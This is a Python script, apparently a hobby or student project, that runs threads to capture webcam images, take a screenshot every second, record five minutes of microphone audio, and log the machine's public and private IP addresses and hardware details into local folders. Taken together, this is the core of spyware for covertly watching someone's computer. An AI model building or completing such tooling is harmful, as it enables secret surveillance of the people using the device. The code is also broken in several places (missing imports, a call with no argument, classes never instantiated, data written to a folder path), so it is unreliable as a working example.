# Libraries
import socket

import cv2
from PIL import ImageGrab
import sounddevice as sd
import wavfile as wf
import os
import numpy as np
import time
import threading
import socket
from requests import get
import platform
class MainFileException(Exception):
    pass

class WEBCAMERA:
    def webcamera(self):
        cap = VideoCapture(0)
        frame, image = cap.read()

        while frame:
            imshow('Webcam', image)
            imwrite('WebCamera.png', image)

            if cv2.waitKey(1) == ord('q'):
                break

        cap.release()
        cv2.destroyAllWindows()

class SCREENSHOTS:
    def __init__(self):
        # Variables
        self.counter = 0
        self.sleepAmount = 1

        # Folder path
        self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Screenshots"

    def screenshots(self):
        while True:
            image = ImageGrab.grab()
            self.counter += 1

            if not os.path.exists(self.folder_path):
                os.makedirs(self.folder_path)

            # Save captured audio to the file path
            file_path = os.path.join(self.folder_path, f'Screenshot{self.counter}')
            image.save(file_path)

            time.sleep(1)

class MICROPHONE:
    def __init__(self):
        # Constants for audio settings
        self.sample_rate = 44100 # Normal wave length for normal sound quality
        self.duration = 300 #Duration in seconds
        self.output_file_name = "Soundfile.wav"

        # Folder path
        self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Soundfiles"
    def microphone(self):
        audio_data = sd.rec(int(self.sample_rate * self.duration), samplerate = self.sample_rate, channels = 2)

        if not os.path.exists(self.folder_path):
            os.makedirs(self.folder_path)

        sd.wait()

        print("Finished capturing audio.\n")

        # Save captured audio to the file path
        file_path = os.path.join(self.folder_path, self.output_file_name)
        wf.write(file_path, self.sample_rate, audio_data)

class SYS_INFO:
    def __init__(self):
        self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Systeminformation"
        self.public_ip_link = "https://api.ipify.org"
    def system_information(self):
        with open(self.folder_path, "a") as f:
            hostname = socket.gethostbyname()
            IPAddr = socket.gethostbyname(hostname)

            try:
                public_ip = get(self.public_ip_link).text
                f.write(f"Public IP Address: {public_ip}\n")
            except Exception:
                f.write("Couldn't get Public IP Address (May be due to max query)\n")

            f.write(f"Processor Info: {platform.processor()}\n")
            f.write(f"System Info: {platform.system()}\n")
            f.write(f"Machine Info: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n")

def main():
    webcamera = WEBCAMERA
    screenshots = SCREENSHOTS
    microphone = MICROPHONE

    try:
        # Create threads for each function
        web_camera_thread = threading.Thread(target=webcamera.webcamera)
        screenshots_thread = threading.Thread(target=screenshots.screenshots)
        microphone_thread = threading.Thread(target=microphone.microphone)

        # Start the threads
        web_camera_thread.start()
        screenshots_thread.start()
        microphone_thread.start()

        # Wait for all threads to finish
        web_camera_thread.join()
        screenshots_thread.join()
        microphone_thread.join()

    except Exception as e:
        raise MainFileException("Main failed to run") from e

if __name__ == '__main__':
    try:
        main()
    except MainFileException as e:
        print(f"Main failed to run: {str(e)}")